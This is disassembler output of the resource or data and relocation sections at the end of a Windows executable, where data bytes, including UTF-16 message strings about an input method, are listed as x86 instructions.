  412aae:	mov    eax,0xd000006
  412ab3:	add    BYTE PTR [eax],dl
  412ab5:	adc    BYTE PTR [eax],al
  412ab7:	add    BYTE PTR [ecx],al
  412ab9:	add    BYTE PTR [eax],ah
  412abb:	add    BYTE PTR [eax+0x4],ch
  412abe:	add    BYTE PTR [eax],al
  412ac0:	push   cs
	...
  412acd:	add    BYTE PTR [eax],al
  412acf:	add    BYTE PTR [edx],bl
  412ad1:	add    BYTE PTR [ebp+0x0],cl
  412ad4:	imul   eax,DWORD PTR [eax],0x720063
  412ada:	outs   dx,DWORD PTR ds:[esi]
  412adb:	add    BYTE PTR [ebx+0x0],dh
  412ade:	outs   dx,DWORD PTR ds:[esi]
  412adf:	add    BYTE PTR [esi+0x0],ah
  412ae2:	je     0x412ae4
  412ae4:	and    BYTE PTR [eax],al
  412ae6:	dec    ecx
  412ae7:	add    BYTE PTR [ebp+0x0],cl
  412aea:	inc    ebp
  412aeb:	add    BYTE PTR [eax],ah
  412aed:	add    BYTE PTR [esi+0x30],ch
  412af0:	pop    edi
  412af1:	push   0xfffffffd
  412af3:	or     BYTE PTR [eax+esi*1+0x36],0x52
  412af8:	push   eax
  412af9:	xchg   esi,eax
  412afa:	push   ebp
  412afb:	xor    BYTE PTR [eax+esi*1+0x30443066],cl
  412b02:	jle    0x412b34
  412b04:	pop    ecx
  412b05:	xor    BYTE PTR [esi+0x7f305400],dl
  412b0b:	dec    edi
  412b0c:	sub    BYTE PTR [ebp+0x2d],dh
  412b0f:	dec    esi
  412b10:	outs   dx,BYTE PTR ds:[esi]
  412b11:	xor    BYTE PTR [edx-0x15cf28d0],ah
  412b17:	xor    BYTE PTR [ecx-0x48cf03d0],dh
  412b1d:	xor    bh,ah
  412b1f:	xor    bl,dh
  412b21:	xor    BYTE PTR [edi+0x30],ch
  412b24:	fisttp QWORD PTR [edi+0x77]
  412b27:	mov    esp,edx
  412b29:	xor    ah,bh
  412b2b:	xor    cl,cl
  412b2d:	xor    BYTE PTR [edi+0x30],ah
  412b30:	aad    0x52
  412b32:	pop    esp
  412b33:	dec    edi
  412b34:	push   edi
  412b35:	xor    BYTE PTR [esi+0x30],ah
  412b38:	inc    esp
  412b39:	xor    BYTE PTR [esi+0x30],bh
  412b3c:	pop    ecx
  412b3d:	xor    BYTE PTR [edx],al
  412b3f:	xor    BYTE PTR [edx],cl
  412b41:	add    BYTE PTR [edx+0x30],cl
  412b44:	mov    ds:0x6e69d85b,al
  412b49:	xor    bh,dl
  412b4b:	xor    cl,ch
  412b4d:	xor    BYTE PTR [eax+esi*1+0x30b730d0],ah
  412b54:	cld    
  412b55:	xor    BYTE PTR [ecx],al
  412b57:	xor    BYTE PTR [ebx-0x1acf52d0],bh
  412b5d:	xor    dl,ch
  412b5f:	xor    dh,al
  412b61:	xor    BYTE PTR [ebx-0x6dcf03d0],ah
  412b67:	xor    ch,bl
  412b69:	dec    edi
  412b6a:	ja     0x412af7
  412b6c:	pop    ecx
  412b6d:	xor    BYTE PTR [ebx-0x7ecfa0d0],cl
  412b73:	xor    BYTE PTR [ecx],al
  412b75:	xor    BYTE PTR [eax+0x53],bl
  412b78:	sahf   
  412b79:	mov    bh,BYTE PTR [ebx+0x76]
  412b7c:	xor    dl,BYTE PTR [ebx-0x75d2cf7c]
  412b82:	call   0x4930:0x69306a5b
  412b89:	add    BYTE PTR [ebp+0x0],cl
  412b8c:	inc    ebp
  412b8d:	add    BYTE PTR [esi+0x30],ch
  412b90:	pop    edi
  412b91:	push   0xfffffffd
  412b93:	sub    BYTE PTR [esi+0x30],0x0
  412b97:	dec    esi
  412b98:	call   0x3671782d
  412b9d:	push   edx
  412b9e:	push   eax
  412b9f:	xchg   esi,eax
  412ba0:	push   ebp
  412ba1:	xor    BYTE PTR [eax+esi*1+0x30443066],cl
  412ba8:	jle    0x412bda
  412baa:	pop    ecx
  412bab:	xor    BYTE PTR [edx],al
  412bad:	xor    BYTE PTR [edx],cl
  412baf:	add    BYTE PTR [esi],dh
  412bb1:	push   edx
  412bb2:	push   eax
  412bb3:	xchg   esi,eax
  412bb4:	push   ebp
  412bb5:	xor    BYTE PTR [eax+esi*1+0x30443066],cl
  412bbc:	mov    esi,DWORD PTR [eax]
  412bbe:	pop    edi
  412bbf:	push   0xfffffffd
  412bc1:	adc    BYTE PTR [edx+0x464f7f30],0x30
  412bc8:	imul   esi,DWORD PTR [eax],0x6f
  412bcb:	xor    BYTE PTR [ecx],al
  412bcd:	xor    ch,bl
  412bcf:	dec    edi
  412bd0:	ja     0x412b5d
  412bd2:	loop   0x412c04
  412bd4:	cld    
  412bd5:	xor    cl,cl
  412bd7:	xor    ch,ah
  412bd9:	dec    esi
  412bda:	push   ss
  412bdb:	pop    ecx
  412bdc:	outs   dx,BYTE PTR ds:[esi]
  412bdd:	xor    BYTE PTR [edx-0x15cf28d0],ah
  412be3:	xor    BYTE PTR [ecx-0x48cf03d0],dh
  412be9:	xor    bh,ah
  412beb:	xor    bl,dh
  412bed:	xor    BYTE PTR [edx-0x616f87d0],dl
  412bf3:	bound  ebx,QWORD PTR [ecx+0x30]
  412bf6:	mov    esi,DWORD PTR [eax]
  412bf8:	dec    ebx
  412bf9:	xor    BYTE PTR [ecx],al
  412bfb:	xor    BYTE PTR [esi+0x30],bh
  412bfe:	pop    edi
  412bff:	xor    BYTE PTR [edi+0x30],ch
  412c02:	(bad)  
  412c03:	xor    BYTE PTR [ecx-0x37cf50d0],bh
  412c09:	xor    bl,al
  412c0b:	xor    bh,dl
  412c0d:	xor    BYTE PTR [edx-0x15cf50d0],dl
  412c13:	xor    bl,al
  412c15:	xor    BYTE PTR [edi+0x66305730],ch
  412c1b:	xor    BYTE PTR [ecx],al
  412c1d:	xor    BYTE PTR [ebp-0x60a159af],cl
  412c23:	pop    ebx
  412c24:	dec    esp
  412c25:	mov    BYTE PTR [edi+0x30],dl
  412c28:	data16 xor BYTE PTR [edi+0x30],cl
  412c2c:	pusha  
  412c2d:	xor    BYTE PTR [ebp+0x30],dl
  412c30:	inc    esp
  412c31:	xor    BYTE PTR [edx],al
  412c33:	xor    BYTE PTR [eax],al
	...
  412c4d:	add    BYTE PTR [eax],al
  412c4f:	add    BYTE PTR [edi],bh
  412c51:	add    BYTE PTR [ebx+0x0],dl
  412c54:	outs   dx,DWORD PTR ds:[esi]
  412c55:	add    BYTE PTR [ebp+0x0],ch
  412c58:	add    BYTE PTR gs:[eax],ah
  412c5b:	add    BYTE PTR [edi+0x0],ch
  412c5e:	data16 add BYTE PTR [eax],ah
  412c61:	add    BYTE PTR [eax+eax*1+0x68],dh
  412c65:	add    BYTE PTR [ebp+0x0],ah
  412c68:	and    BYTE PTR [eax],al
  412c6a:	data16 add BYTE PTR [ebp+0x0],dh
  412c6e:	outs   dx,BYTE PTR ds:[esi]
  412c6f:	add    BYTE PTR [ebx+0x0],ah
  412c72:	je     0x412c74
  412c74:	imul   eax,DWORD PTR [eax],0x6e006f
  412c7a:	jae    0x412c7c
  412c7c:	and    BYTE PTR [eax],al
  412c7e:	outs   dx,DWORD PTR ds:[esi]
  412c7f:	add    BYTE PTR [esi+0x0],ah
  412c82:	and    BYTE PTR [eax],al
  412c84:	dec    ebp
  412c85:	add    BYTE PTR [ecx+0x0],ch
  412c88:	arpl   WORD PTR [eax],ax
  412c8a:	jb     0x412c8c
  412c8c:	outs   dx,DWORD PTR ds:[esi]
  412c8d:	add    BYTE PTR [ebx+0x0],dh
  412c90:	outs   dx,DWORD PTR ds:[esi]
  412c91:	add    BYTE PTR [esi+0x0],ah
  412c94:	je     0x412c96
  412c96:	and    BYTE PTR [eax],al
  412c98:	dec    ecx
  412c99:	add    BYTE PTR [ebp+0x0],cl
  412c9c:	inc    ebp
  412c9d:	add    BYTE PTR [eax],ah
  412c9f:	add    BYTE PTR [ecx+0x0],ah
  412ca2:	jb     0x412ca4
  412ca4:	add    BYTE PTR gs:[eax],ah
  412ca7:	add    BYTE PTR [ebx+0x0],ah
  412caa:	jne    0x412cac
  412cac:	jb     0x412cae
  412cae:	jb     0x412cb0
  412cb0:	add    BYTE PTR gs:[esi+0x0],ch
  412cb4:	je     0x412cb6
  412cb6:	ins    BYTE PTR es:[edi],dx
  412cb7:	add    BYTE PTR [ecx+0x0],bh
  412cba:	and    BYTE PTR [eax],al
  412cbc:	jb     0x412cbe
  412cbe:	add    BYTE PTR gs:[ebx+0x0],dh
  412cc2:	je     0x412cc4
  412cc4:	jb     0x412cc6
  412cc6:	imul   eax,DWORD PTR [eax],0x740063
  412ccc:	add    BYTE PTR gs:[eax+eax*1+0xd],ah
  412cd1:	add    DWORD PTR [eax+eax*1+0x68],edx
  412cd5:	add    BYTE PTR [ebp+0x0],ah
  412cd8:	and    BYTE PTR [eax],al
  412cda:	arpl   WORD PTR [eax],ax
  412cdc:	jne    0x412cde
  412cde:	jb     0x412ce0
  412ce0:	jb     0x412ce2
  412ce2:	add    BYTE PTR gs:[esi+0x0],ch
  412ce6:	je     0x412ce8
  412ce8:	and    BYTE PTR [eax],al
  412cea:	popa   
  412ceb:	add    BYTE PTR [ebx+0x0],ah
  412cee:	je     0x412cf0
  412cf0:	imul   eax,DWORD PTR [eax],0x650076
  412cf6:	and    BYTE PTR [eax],al
  412cf8:	popa   
  412cf9:	add    BYTE PTR [eax+0x0],dh
  412cfc:	jo     0x412cfe
  412cfe:	ins    BYTE PTR es:[edi],dx
  412cff:	add    BYTE PTR [ecx+0x0],ch
  412d02:	arpl   WORD PTR [eax],ax
  412d04:	popa   
  412d05:	add    BYTE PTR [eax+eax*1+0x69],dh
  412d09:	add    BYTE PTR [edi+0x0],ch
  412d0c:	outs   dx,BYTE PTR ds:[esi]
  412d0d:	add    BYTE PTR [eax],ah
  412d0f:	add    BYTE PTR [ecx+0x0],ch
  412d12:	jae    0x412d14
  412d14:	and    BYTE PTR [eax],al
  412d16:	jb     0x412d18
  412d18:	jne    0x412d1a
  412d1a:	outs   dx,BYTE PTR ds:[esi]
  412d1b:	add    BYTE PTR [esi+0x0],ch
  412d1e:	imul   eax,DWORD PTR [eax],0x67006e
  412d24:	and    BYTE PTR [eax],al
  412d26:	imul   eax,DWORD PTR [eax],0x20006e
  412d2c:	jo     0x412d2e
  412d2e:	jb     0x412d30
  412d30:	outs   dx,DWORD PTR ds:[esi]
  412d31:	add    BYTE PTR [eax+eax*1+0x65],dh
  412d35:	add    BYTE PTR [ebx+0x0],ah
  412d38:	je     0x412d3a
  412d3a:	imul   eax,DWORD PTR [eax],0x6e006f
  412d40:	and    BYTE PTR [eax],al
  412d42:	ins    DWORD PTR es:[edi],dx
  412d43:	add    BYTE PTR [edi+0x0],ch
  412d46:	add    BYTE PTR fs:[ebp+0x0],ah
  412d4a:	add    BYTE PTR cs:[edx],cl
  412d4d:	add    BYTE PTR [ebx+0x0],dl
  412d50:	outs   dx,DWORD PTR ds:[esi]
  412d51:	add    BYTE PTR [ebp+0x0],ch
  412d54:	add    BYTE PTR gs:[eax],ah
  412d57:	add    BYTE PTR [esi+0x0],ah
  412d5a:	jne    0x412d5c
  412d5c:	outs   dx,BYTE PTR ds:[esi]
  412d5d:	add    BYTE PTR [ebx+0x0],ah
  412d60:	je     0x412d62
  412d62:	imul   eax,DWORD PTR [eax],0x6e006f
  412d68:	jae    0x412d6a
  412d6a:	sub    al,0x0
  412d6c:	and    BYTE PTR [eax],al
  412d6e:	jae    0x412d70
  412d70:	jne    0x412d72
  412d72:	arpl   WORD PTR [eax],ax
  412d74:	push   0x61002000
  412d79:	add    BYTE PTR [ebx+0x0],dh
  412d7c:	and    BYTE PTR [eax],al
  412d7e:	popa   
  412d7f:	add    BYTE PTR [eax+eax*1+0x64],ah
  412d83:	add    BYTE PTR [ecx+0x0],ch
  412d86:	outs   dx,BYTE PTR ds:[esi]
  412d87:	add    BYTE PTR [edi+0x0],ah
  412d8a:	and    BYTE PTR [eax],al
  412d8c:	ja     0x412d8e
  412d8e:	outs   dx,DWORD PTR ds:[esi]
  412d8f:	add    BYTE PTR [edx+0x0],dh
  412d92:	add    BYTE PTR fs:[eax+eax*1],ch
  412d96:	and    BYTE PTR [eax],al
  412d98:	jae    0x412d9a
  412d9a:	add    BYTE PTR gs:[eax+eax*1+0x74],dh
  412d9f:	add    BYTE PTR [ecx+0x0],ch
  412da2:	outs   dx,BYTE PTR ds:[esi]
  412da3:	add    BYTE PTR [edi+0x0],ah
  412da6:	and    BYTE PTR [eax],al
  412da8:	jo     0x412daa
  412daa:	jb     0x412dac
  412dac:	outs   dx,DWORD PTR ds:[esi]
  412dad:	add    BYTE PTR [eax+0x0],dh
  412db0:	add    BYTE PTR gs:[edx+0x0],dh
  412db4:	je     0x412db6
  412db6:	jns    0x412db8
  412db8:	sub    al,0x0
  412dba:	and    BYTE PTR [eax],al
  412dbc:	popa   
  412dbd:	add    BYTE PTR [edx+0x0],dh
  412dc0:	add    BYTE PTR gs:[eax],ah
  412dc3:	add    BYTE PTR [edx+0x0],dh
  412dc6:	add    BYTE PTR gs:[ebx+0x0],dh
  412dca:	je     0x412dcc
  412dcc:	jb     0x412dce
  412dce:	imul   eax,DWORD PTR [eax],0x740063
  412dd4:	add    BYTE PTR gs:[eax+eax*1+0x20],ah
  412dd9:	add    BYTE PTR [eax+eax*1+0x6f],dh
  412ddd:	add    BYTE PTR [eax],ah
  412ddf:	add    BYTE PTR [eax+0x0],dh
  412de2:	jb     0x412de4
  412de4:	outs   dx,DWORD PTR ds:[esi]
  412de5:	add    BYTE PTR [eax+eax*1+0x65],dh
  412de9:	add    BYTE PTR [ebx+0x0],ah
  412dec:	je     0x412dee
  412dee:	and    BYTE PTR [eax],al
  412df0:	jns    0x412df2
  412df2:	outs   dx,DWORD PTR ds:[esi]
  412df3:	add    BYTE PTR [ebp+0x0],dh
  412df6:	jb     0x412df8
  412df8:	and    BYTE PTR [eax],al
  412dfa:	jo     0x412dfc
  412dfc:	jb     0x412dfe
  412dfe:	imul   eax,DWORD PTR [eax],0x610076
  412e04:	arpl   WORD PTR [eax],ax
  412e06:	jns    0x412e08
  412e08:	and    BYTE PTR [eax],al
  412e0a:	popa   
  412e0b:	add    BYTE PTR [esi+0x0],ch
  412e0e:	add    BYTE PTR fs:[eax],ah
  412e11:	add    BYTE PTR [ebx+0x0],dh
  412e14:	add    BYTE PTR gs:[ebx+0x0],ah
  412e18:	jne    0x412e1a
  412e1a:	jb     0x412e1c
  412e1c:	imul   eax,DWORD PTR [eax],0x790074
  412e22:	add    BYTE PTR cs:[edx],cl
  412e25:	add    BYTE PTR [eax+eax*1+0x72],dl
  412e29:	add    BYTE PTR [ecx+0x0],bh
  412e2c:	and    BYTE PTR [eax],al
  412e2e:	popa   
  412e2f:	add    BYTE PTR [edi+0x0],ah
  412e32:	popa   
  412e33:	add    BYTE PTR [ecx+0x0],ch
  412e36:	outs   dx,BYTE PTR ds:[esi]
  412e37:	add    BYTE PTR [eax],ah
  412e39:	add    BYTE PTR [ecx+0x0],ah
  412e3c:	data16 add BYTE PTR [eax+eax*1+0x65],dh
  412e41:	add    BYTE PTR [edx+0x0],dh
  412e44:	and    BYTE PTR [eax],al
  412e46:	arpl   WORD PTR [eax],ax
  412e48:	ins    BYTE PTR es:[edi],dx
  412e49:	add    BYTE PTR [ecx+0x0],ch
  412e4c:	arpl   WORD PTR [eax],ax
  412e4e:	imul   eax,DWORD PTR [eax],0x69
  412e51:	add    BYTE PTR [esi+0x0],ch
  412e54:	add    BYTE PTR [bx+si],ah
  412e57:	add    BYTE PTR [edi+0x0],ch
  412e5a:	outs   dx,BYTE PTR ds:[esi]
  412e5b:	add    BYTE PTR [eax],ah
  412e5d:	add    BYTE PTR [eax+eax*1+0x68],dh
  412e61:	add    BYTE PTR [ebp+0x0],ah
  412e64:	and    BYTE PTR [eax],al
  412e66:	add    BYTE PTR fs:[ebp+0x0],ah
  412e6a:	jae    0x412e6c
  412e6c:	imul   eax,DWORD PTR [eax],0x74
  412e6f:	add    BYTE PTR [edi+0x0],ch
  412e72:	jo     0x412e74
  412e74:	and    BYTE PTR [eax],al
  412e76:	outs   dx,DWORD PTR ds:[esi]
  412e77:	add    BYTE PTR [edx+0x0],dh
  412e7a:	and    BYTE PTR [eax],al
  412e7c:	jae    0x412e7e
  412e7e:	add    BYTE PTR gs:[eax+eax*1+0x65],ch
  412e83:	add    BYTE PTR [ebx+0x0],ah
  412e86:	je     0x412e88
  412e88:	imul   eax,DWORD PTR [eax],0x67006e
  412e8e:	and    BYTE PTR [eax],al
  412e90:	popa   
  412e91:	add    BYTE PTR [esi+0x0],ch
  412e94:	and    BYTE PTR [eax],al
  412e96:	popa   
  412e97:	add    BYTE PTR [eax+0x0],dh
  412e9a:	jo     0x412e9c
  412e9c:	ins    BYTE PTR es:[edi],dx
  412e9d:	add    BYTE PTR [ecx+0x0],ch
  412ea0:	arpl   WORD PTR [eax],ax
  412ea2:	popa   
  412ea3:	add    BYTE PTR [eax+eax*1+0x69],dh
  412ea7:	add    BYTE PTR [edi+0x0],ch
  412eaa:	outs   dx,BYTE PTR ds:[esi]
  412eab:	add    BYTE PTR [eax],ah
  412ead:	add    BYTE PTR [esi+0x0],ch
  412eb0:	outs   dx,DWORD PTR ds:[esi]
  412eb1:	add    BYTE PTR [eax+eax*1+0x20],dh
  412eb5:	add    BYTE PTR [edx+0x0],dh
  412eb8:	jne    0x412eba
  412eba:	outs   dx,BYTE PTR ds:[esi]
  412ebb:	add    BYTE PTR [esi+0x0],ch
  412ebe:	imul   eax,DWORD PTR [eax],0x67006e
  412ec4:	and    BYTE PTR [eax],al
  412ec6:	imul   eax,DWORD PTR [eax],0x20006e
  412ecc:	jo     0x412ece
  412ece:	jb     0x412ed0
  412ed0:	outs   dx,DWORD PTR ds:[esi]
  412ed1:	add    BYTE PTR [eax+eax*1+0x65],dh
  412ed5:	add    BYTE PTR [ebx+0x0],ah
  412ed8:	je     0x412eda
  412eda:	imul   eax,DWORD PTR [eax],0x6e006f
  412ee0:	and    BYTE PTR [eax],al
  412ee2:	ins    DWORD PTR es:[edi],dx
  412ee3:	add    BYTE PTR [edi+0x0],ch
  412ee6:	add    BYTE PTR fs:[ebp+0x0],ah
  412eea:	add    BYTE PTR cs:[eax],al
	...

Disassembly of section .reloc:

00413000 <.reloc>:
  413000:	add    BYTE PTR [eax],dl
  413002:	add    BYTE PTR [eax],al
  413004:	test   al,0x1
  413006:	add    BYTE PTR [eax],al
  413008:	add    al,0x30
  41300a:	or     BYTE PTR [eax],dh
  41300c:	or     al,0x30
  41300e:	adc    BYTE PTR [eax],dh
  413010:	adc    al,0x30
  413012:	sbb    BYTE PTR [eax],dh
  413014:	sbb    al,0x30
  413016:	and    BYTE PTR [eax],dh
  413018:	sub    al,0x30
  41301a:	xor    BYTE PTR [eax],dh
  41301c:	and    BYTE PTR [ecx],dh
  41301e:	and    al,0x31
  413020:	sub    BYTE PTR [ecx],dh
  413022:	sub    al,0x31
  413024:	xor    BYTE PTR [ecx],dh
  413026:	inc    esp
  413027:	xor    DWORD PTR [eax+0x31],ecx
  41302a:	dec    esp
  41302b:	xor    DWORD PTR [eax+0x31],edx
  41302e:	push   esp
  41302f:	xor    DWORD PTR [eax+0x31],ebx
  413032:	pop    esp
  413033:	xor    DWORD PTR [eax+0x31],esp
  413036:	xor    DWORD PTR fs:[eax+0x31],ebp
  41303a:	ins    BYTE PTR es:[edi],dx
  41303b:	xor    DWORD PTR [eax+0x31],esi
  41303e:	je     0x413071
  413040:	js     0x413073
  413042:	xchg   esp,eax
  413043:	xor    DWORD PTR [eax-0x5fce63cf],ebx
  413049:	xor    DWORD PTR [ecx+esi*1+0x31d031a8],esp
  413050:	aam    0x31
  413052:	fdiv   DWORD PTR [ecx]
  413054:	fdiv   QWORD PTR [ecx]
  413056:	loopne 0x413089
  413058:	in     al,0x31
  41305a:	sbb    al,0x32
  41305c:	and    al,0x32
  41305e:	sub    al,0x32
  413060:	xor    al,0x32
  413062:	cmp    al,0x32
  413064:	inc    esp
  413065:	xor    cl,BYTE PTR [edx+esi*1+0x54]
  413069:	xor    bl,BYTE PTR [edx+esi*1+0x64]
  41306d:	xor    ch,BYTE PTR [edx+esi*1+0x74]
  413071:	xor    bh,BYTE PTR [edx+esi*1-0x7c]
  413075:	xor    cl,BYTE PTR [edx+esi*1+0x329c3294]
  41307c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41307d:	xor    ch,BYTE PTR [edx+esi*1+0x32bc32b4]
  413084:	les    esi,FWORD PTR [edx]
  413086:	int3   
  413087:	xor    dl,ah
  413089:	xor    bl,ah
  41308b:	xor    ah,ah
  41308d:	xor    ch,ah
  41308f:	xor    dh,ah
  413091:	xor    bh,ah
  413093:	xor    al,BYTE PTR [ebx+esi*1]
  413096:	or     al,0x33
  413098:	adc    al,0x33
  41309a:	sbb    al,0x33
  41309c:	and    al,0x33
  41309e:	sub    al,0x33
  4130a0:	xor    al,0x33
  4130a2:	cmp    al,0x33
  4130a4:	inc    esp
  4130a5:	xor    ecx,DWORD PTR [ebx+esi*1+0x54]
  4130a9:	xor    ebx,DWORD PTR [ebx+esi*1+0x64]
  4130ad:	xor    ebp,DWORD PTR [ebx+esi*1+0x74]
  4130b1:	xor    edi,DWORD PTR [ebx+esi*1-0x7c]
  4130b5:	xor    ecx,DWORD PTR [ebx+esi*1+0x339c3394]
  4130bc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4130bd:	xor    ebp,DWORD PTR [ebx+esi*1+0x33bc33b4]
  4130c4:	les    esi,FWORD PTR [ebx]
  4130c6:	int3   
  4130c7:	xor    edx,esp
  4130c9:	xor    ebx,esp
  4130cb:	xor    esp,esp
  4130cd:	xor    ebp,esp
  4130cf:	xor    esi,esp
  4130d1:	xor    edi,esp
  4130d3:	xor    eax,DWORD PTR [esp+esi*1]
  4130d6:	or     al,0x34
  4130d8:	adc    al,0x34
  4130da:	sbb    al,0x34
  4130dc:	and    al,0x34
  4130de:	sub    al,0x34
  4130e0:	xor    al,0x34
  4130e2:	cmp    al,0x34
  4130e4:	inc    esp
  4130e5:	xor    al,0x4c
  4130e7:	xor    al,0x54
  4130e9:	xor    al,0x5c
  4130eb:	xor    al,0x64
  4130ed:	xor    al,0x44
  4130ef:	cmp    BYTE PTR [eax+edi*1+0x54],cl
  4130f3:	cmp    BYTE PTR [eax+edi*1+0x64],bl
  4130f7:	cmp    BYTE PTR [eax+edi*1+0x74],ch
  4130fb:	cmp    BYTE PTR [eax+edi*1-0x7c],bh
  4130ff:	cmp    BYTE PTR [eax+edi*1+0x389c3894],cl
  413106:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413107:	cmp    BYTE PTR [eax+edi*1+0x38bc38b4],ch
  41310e:	les    edi,FWORD PTR [eax]
  413110:	int3   
  413111:	cmp    ah,dl
  413113:	cmp    ah,bl
  413115:	cmp    ah,ah
  413117:	cmp    ah,ch
  413119:	cmp    ah,dh
  41311b:	cmp    ah,bh
  41311d:	cmp    BYTE PTR [ecx+edi*1],al
  413120:	or     al,0x39
  413122:	adc    al,0x39
  413124:	sbb    al,0x39
  413126:	and    al,0x39
  413128:	sub    al,0x39
  41312a:	xor    al,0x39
  41312c:	cmp    al,0x39
  41312e:	inc    esp
  41312f:	cmp    DWORD PTR [ecx+edi*1+0x54],ecx
  413133:	cmp    DWORD PTR [ecx+edi*1+0x64],ebx
  413137:	cmp    DWORD PTR [ecx+edi*1+0x74],ebp
  41313b:	cmp    DWORD PTR [ecx+edi*1-0x7c],edi
  41313f:	cmp    DWORD PTR [ecx+edi*1+0x399c3994],ecx
  413146:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413147:	cmp    DWORD PTR [ecx+edi*1+0x39bc39b4],ebp
  41314e:	les    edi,FWORD PTR [ecx]
  413150:	int3   
  413151:	cmp    esp,edx
  413153:	cmp    esp,ebx
  413155:	cmp    esp,esp
  413157:	cmp    esp,ebp
  413159:	cmp    esp,esi
  41315b:	cmp    esp,edi
  41315d:	cmp    DWORD PTR [edx+edi*1],eax
  413160:	or     al,0x3a
  413162:	adc    al,0x3a
  413164:	sbb    al,0x3a
  413166:	and    al,0x3a
  413168:	sub    al,0x3a
  41316a:	xor    al,0x3a
  41316c:	cmp    al,0x3a
  41316e:	inc    esp
  41316f:	cmp    cl,BYTE PTR [edx+edi*1+0x54]
  413173:	cmp    bl,BYTE PTR [edx+edi*1+0x64]
  413177:	cmp    ch,BYTE PTR [edx+edi*1+0x74]
  41317b:	cmp    bh,BYTE PTR [edx+edi*1-0x7c]
  41317f:	cmp    cl,BYTE PTR [edx+edi*1+0x3a9c3a94]
  413186:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413187:	cmp    ch,BYTE PTR [edx+edi*1+0x3fc43fc0]
  41318e:	enter  0xcc3f,0x3f
  413192:	sar    BYTE PTR [edi],1
  413194:	aam    0x3f
  413196:	fdivr  DWORD PTR [edi]
  413198:	fdivr  QWORD PTR [edi]
  41319a:	loopne 0x4131db
  41319c:	in     al,0x3f
  41319e:	call   0xf0811de2
  4131a3:	aas    
  4131a4:	hlt    
  4131a5:	aas    
  4131a6:	add    BYTE PTR [eax],al
  4131a8:	add    BYTE PTR [eax],ah
  4131aa:	add    BYTE PTR [eax],al
  4131ac:	mov    esp,0x94000000
  4131b1:	xor    bl,BYTE PTR [eax-0x57cd5fce]
  4131b7:	xor    al,al
  4131b9:	xor    bl,al
  4131bb:	xor    bl,ah
  4131bd:	xor    ah,al
  4131bf:	xor    ah,ah
  4131c1:	xor    bh,al
  4131c3:	xor    cl,BYTE PTR [eax]
  4131c5:	xor    ecx,DWORD PTR [ebx+esi*1]
  4131c8:	adc    BYTE PTR [ebx],dh
  4131ca:	sub    BYTE PTR [ebx],dh
  4131cc:	sub    al,0x33
  4131ce:	inc    eax
  4131cf:	xor    eax,DWORD PTR [ebx+esi*1+0x5c]
  4131d3:	xor    esp,DWORD PTR [eax+0x33]
  4131d6:	xor    edi,DWORD PTR fs:[eax+0x33]
  4131da:	mov    BYTE PTR [ebx],dh
  4131dc:	mov    WORD PTR [ebx],?
  4131de:	addr16 cmp ecx,ebx
  4131e1:	cmp    DWORD PTR [ecx],eax
  4131e3:	cmp    bh,BYTE PTR [ebx+0x3a]
  4131e6:	mov    ah,0x3a
  4131e8:	les    edi,FWORD PTR [edx]
  4131ea:	daa    
  4131eb:	cmp    eax,DWORD PTR [edx+0x3b]
  4131ee:	inc    esi
  4131ef:	cmp    ecx,DWORD PTR [ebx+edi*1+0x50]
  4131f3:	cmp    edx,DWORD PTR [esi+0x3b]
  4131f6:	pop    edx
  4131f7:	cmp    esp,DWORD PTR [edi+0x3b]
  4131fa:	ins    DWORD PTR es:[edi],dx
  4131fb:	cmp    esi,DWORD PTR [ebx+0x3b]
  4131fe:	jns    0x41323b
  413200:	cmp    DWORD PTR [ebx],0xffffff99
  413203:	cmp    esp,DWORD PTR [edx-0x3ec458c5]
  413209:	cmp    eax,edi
  41320b:	cmp    ecx,esp
  41320d:	cmp    esp,esi
  41320f:	cmp    ebp,ebx
  413211:	cmp    eax,DWORD PTR [ecx]
  413213:	cmp    al,0x11
  413215:	cmp    al,0x21
  413217:	cmp    al,0x49
  413219:	cmp    al,0x6c
  41321b:	cmp    al,0x77
  41321d:	cmp    al,0x7e
  41321f:	cmp    al,0xa7
  413221:	cmp    al,0xaf
  413223:	cmp    al,0xcb
  413225:	cmp    al,0x27
  413227:	cmp    eax,0x3d613d57
  41322c:	addr16 cmp eax,0x3d783d71
  413232:	xchg   BYTE PTR ds:0x3db33da7,bh
  413238:	mov    ebp,0xd43dce3d
  41323d:	cmp    eax,0x3dde3dd9
  413242:	in     eax,0x3d
  413244:	in     eax,dx
  413245:	cmp    eax,0x3e493dfc
  41324a:	arpl   WORD PTR [esi],di
  41324c:	outs   dx,DWORD PTR ds:[esi]
  41324d:	ds jp  0x41328e
  413250:	loop   0x413290
  413252:	idiv   BYTE PTR [esi]
  413254:	add    BYTE PTR [edi],bh
  413256:	or     DWORD PTR [edi],edi
  413258:	adc    BYTE PTR [edi],bh
  41325a:	and    BYTE PTR [edi],bh
  41325c:	jne    0x41329d
  41325e:	xchg   edx,eax
  41325f:	aas    
  413260:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413261:	aas    
  413262:	les    edi,FWORD PTR [edi]
  413264:	add    BYTE PTR [eax],dh
  413266:	add    BYTE PTR [eax],al
  413268:	sub    BYTE PTR [ecx],al
  41326a:	add    BYTE PTR [eax],al
  41326c:	inc    edi
  41326d:	xor    BYTE PTR [ebp+0x30],dl
  413270:	pop    esi
  413271:	xor    BYTE PTR [edi+0x30],ah
  413274:	je     0x4132a6
  413276:	xchg   DWORD PTR [eax],esi
  413278:	mov    ?,WORD PTR [eax]
  41327a:	stos   DWORD PTR es:[edi],eax
  41327b:	xor    BYTE PTR [edx-0x22cf2bd0],dh
  413281:	xor    dh,ah
  413283:	xor    bh,ch
  413285:	xor    BYTE PTR [eax],al
  413287:	xor    DWORD PTR [ecx],ecx
  413289:	xor    DWORD PTR [edx],edx
  41328b:	xor    DWORD PTR [ebx],ebx
  41328d:	xor    DWORD PTR [ecx+esi*1],ebp
  413290:	xor    eax,0x7a314f31
  413295:	xor    DWORD PTR [edi-0x29ce65cf],ecx
  41329b:	xor    edi,esi
  41329d:	xor    DWORD PTR [edx+esi*1],ecx
  4132a0:	adc    dh,BYTE PTR [edx]
  4132a2:	sub    DWORD PTR [edx],esi
  4132a4:	bound  esi,QWORD PTR [edx]
  4132a6:	int3   
  4132a7:	xor    eax,DWORD PTR [eax]
  4132a9:	xor    al,0xac
  4132ab:	xor    eax,0x362f361d
  4132b0:	dec    ebp
